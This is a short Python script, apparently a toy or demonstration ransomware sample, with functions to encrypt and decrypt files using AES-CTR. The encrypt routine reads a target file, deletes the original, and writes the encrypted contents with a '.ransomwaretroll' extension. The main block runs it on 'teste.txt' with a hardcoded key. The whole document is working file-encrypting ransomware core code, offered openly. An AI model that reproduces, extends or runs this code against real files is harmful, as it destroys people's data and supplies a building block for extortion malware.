import os
import pyaes

def encrypt_file(file_path, key):
    try:
        # open file to be encrypt
        with open(file_path, "rb") as file:
            file_data = file.read()

        # remove original file
        os.remove(file_path)

        # start encrypt proccess
        aes = pyaes.AESModeOfOperationCTR(key)

        # encrypt file
        crypto_data = aes.encrypt(file_data)

        # save file with extension ".ransomwaretroll"
        encrypted_file_path = file_path + ".ransomwaretroll"
        with open(encrypted_file_path, 'wb') as new_file:
            new_file.write(crypto_data)

        print(f'Encrypted file: {encrypted_file_path}')
    except Exception as e:
        print(f"Error encrypting the file: {str(e)}")

def decrypt_file(encrypted_file_path, key):
    try:
        # Open the encrypted file
        with open(encrypted_file_path, "rb") as encrypted_file:
            encrypted_data = encrypted_file.read()

        # Initialize the decryption object
        aes = pyaes.AESModeOfOperationCTR(key)

        # Decrypt the file
        decrypted_data = aes.decrypt(encrypted_data)

        # Save the decrypted file (removing the extension ".ransomwaretroll")
        decrypted_file_path = encrypted_file_path.replace(".ransomwaretroll", "")
        with open(decrypted_file_path, 'wb') as new_file:
            new_file.write(decrypted_data)

        print(f'Decrypted file: {decrypted_file_path}')
    except Exception as e:
        print(f"Error decrypting the file: {str(e)}")

if __name__ == "__main__":
    file_name = r"teste.txt" #set the file name/path
    key = b"testeransomwares" #set encrypt key

    encrypt_file(file_name, key)

    # Example of how to decrypt the file
    # decrypt_file("file_encrypted.txt.ransomwaretroll", key)
